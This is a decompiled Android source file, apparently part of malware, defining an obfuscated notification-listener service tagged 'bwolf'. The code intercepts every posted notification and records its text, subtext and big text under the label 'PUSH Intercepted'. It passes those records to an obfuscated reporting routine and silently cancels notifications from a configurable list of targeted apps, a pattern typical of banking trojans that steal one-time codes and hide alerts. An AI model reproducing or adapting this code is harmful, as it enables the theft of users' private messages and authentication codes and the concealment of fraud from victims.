package com.sonnokta;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.sonnokta.utils.LogUtil;

import fddo.Cgoto;
import fddo.Cthrow;

import java.util.ArrayList;
import java.util.Iterator;

public class p025n extends NotificationListenerService {
    private static String TAG = "bwolf-p025n";

    private static boolean ifdf;

    /* renamed from: fddo  reason: collision with root package name */
    ArrayList<String> f94fddo = new ArrayList<>();

    public IBinder onBind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onBind ---");
        return super.onBind(intent);
    }

    public void onListenerConnected() {
        LogUtil.showErrorLog(TAG, "--- onListenerConnected ---");
        ifdf = true;
        if (this.f94fddo.size() > 0) {
            Iterator<String> it = this.f94fddo.iterator();
            while (it.hasNext()) {
                String next = it.next();
                cancelNotification(next);
                this.f94fddo.remove(next);
            }
        }
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        LogUtil.showErrorLog(TAG, "--- onNotificationPosted ---");
        Context applicationContext = getApplicationContext();
        try {
            if (Cthrow.m156for(applicationContext, "uptime", 0L).longValue() >= ((long) Cthrow.ifdf(applicationContext, "block_push_delay", 0).intValue())) {
                String packageName = statusBarNotification.getPackageName();
                boolean tjtsrfghsjrfgjhs = Cgoto.tjtsrfghsjrfgjhs(Cthrow.m158new(applicationContext, "block_push_apps", ""), packageName);
                if (Cgoto.tjtsrfghsjrfgjhs(Cthrow.m158new(applicationContext, "minimize_apps", ""), packageName)) {
                    tjtsrfghsjrfgjhs = true;
                }
                if (tjtsrfghsjrfgjhs && ifdf) {
                    cancelNotification(statusBarNotification.getKey());
                    this.f94fddo.add(statusBarNotification.getKey());
                }
                if (statusBarNotification.getNotification().tickerText != null) {
                    String str = Cgoto.m132strictfp(applicationContext, packageName);
                    String charSequence = statusBarNotification.getNotification().tickerText.toString();
                    Bundle bundle = statusBarNotification.getNotification().extras;
                    StringBuilder sb = new StringBuilder("PUSH Intercepted from ");
                    sb.append(str);
                    sb.append(" (" + packageName + "): ");
                    sb.append(charSequence);
                    if (bundle.get("android.text") != null) {
                        sb.append(" / " + bundle.get("android.text").toString());
                    }
                    if (bundle.get("android.subText") != null) {
                        sb.append(" / " + bundle.get("android.subText").toString());
                    }
                    if (bundle.get("android.bigText") != null) {
                        sb.append(" / " + bundle.get("android.bigText").toString());
                    }
                    if (bundle.get("android.textLines") != null) {
                        sb.append(" / " + bundle.get("android.textLines").toString());
                    }
                    sb.append("; Blocked: ");
                    sb.append(tjtsrfghsjrfgjhs ? "Yes" : "No");
                    Cgoto.g(applicationContext, sb.toString());
                }
            }
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, "EXC_PUSHSRV", e);
        }
    }
}
